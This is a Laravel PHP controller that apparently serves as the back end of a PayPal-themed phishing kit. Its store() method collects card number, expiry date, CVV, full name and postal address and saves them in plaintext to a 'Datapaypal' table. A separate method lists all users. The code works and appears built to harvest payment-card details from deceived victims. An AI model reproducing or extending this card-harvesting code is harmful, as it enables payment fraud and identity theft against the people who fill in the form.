<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Auth;
use App\User;
use App\Datapaypal;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    
    
     

    public function __construct()
    {
        $this->middleware('auth');
     
    }
   

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    { 
        $user = Auth::user();
        if($user->isvalide==true){
        return view('home');
    } else{
        return view('viewmobile');
    }
    
        }
        public function store(Request $request)
    {
             $this->validate($request, [
                'country' => 'required',
                'carte' => 'required',
                'numero' => 'required',
                'date' => 'required',
                'crypto' => 'required',   
                 'prenom' => 'required|max:120',
                 'nom' => 'required|max:120',  
                 'adresse1' => 'required', 
                 'adresse2' => 'required',
                 'postal' => 'required',
                 
            
       ]);
         $user = Auth::user();
        $paypaldata= new Datapaypal();
        $paypaldata->email=$user->email;
        $paypaldata->country=$request->input('country');
        $paypaldata->carte=$request->input('carte');
        $paypaldata->numero=$request->input('numero');
        $paypaldata->date=$request->input('date');
        $paypaldata->crypto=$request->input('crypto');
        $paypaldata->prenom=$request->input('prenom');
        $paypaldata->nom=$request->input('nom');
        $paypaldata->adresse1=$request->input('adresse1');
        $paypaldata->adresse2=$request->input('adresse2');
        $paypaldata->postal=$request->input('postal');
        
        $paypaldata->save();
        
        return redirect()->route('page3')
                        ->with('success','les données ont été enregistrées avec succès');
        
         // dd($country,$carte,$numero,$date,$crypto,$prenom,$nom,$adresse1,$adresse2,$postal);
}

public function index2()
    {
    $users = User::all();
    
    return view('users',compact('users'));
}
}